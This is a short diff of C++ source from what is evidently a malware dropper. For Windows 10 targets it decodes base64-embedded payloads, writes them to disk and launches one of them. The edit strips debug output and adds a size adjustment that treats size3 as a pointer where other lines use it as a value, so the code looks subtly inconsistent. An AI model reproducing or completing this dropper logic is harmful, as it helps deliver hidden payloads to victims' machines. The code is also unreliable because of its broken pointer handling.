@@ -198,11 +198,11 @@ int main(int argc, char* argv[])
 	else if (os_version == 10) {
 
 		dropper_start(3);
-		std::cout << "dropper size 3: " << size3;
 		dropper_start(1);
 
 	#if DROPPER_BASE64 == 1
 		data1 = base64decode(data1, &size1);
+		*size3 = *size3 - 1;
 		data3 = base64decode(data3, &size3);
 	#endif
 
@@ -212,9 +212,7 @@ int main(int argc, char* argv[])
 	#endif
 
 		drop(size1, data1, name1);
-		std::cout << "This is size1: " << size1 << "\n";
 		drop(size3, data3, name3);
-		std::cout << "This is size3: " << size3 << "\n";
 
 		bool result = non_exe_launch(name3);
 
